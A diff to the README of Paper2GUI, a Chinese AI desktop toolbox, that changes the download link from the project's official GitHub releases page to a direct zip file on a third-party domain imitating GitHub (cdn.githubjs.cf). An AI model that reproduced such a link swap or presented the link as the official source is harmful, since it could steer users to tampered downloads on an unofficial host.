@@ -9,7 +9,7 @@ Paper2GUI: 一款面向普通人的AI桌面APP工具箱，免安装即开即用�
 
 ![](docs/images/xiaobaituai.png)
 
-下载地址：[Download](https://github.com/Baiyuetribe/paper2gui/releases/tag/Published)
+下载地址：[Download](https://cdn.githubjs.cf/Baiyuetribe/paper2gui/releases/download/Published/XiaoBaituAI_v2.0.2.zip)
 
 ### 已发布内容
 
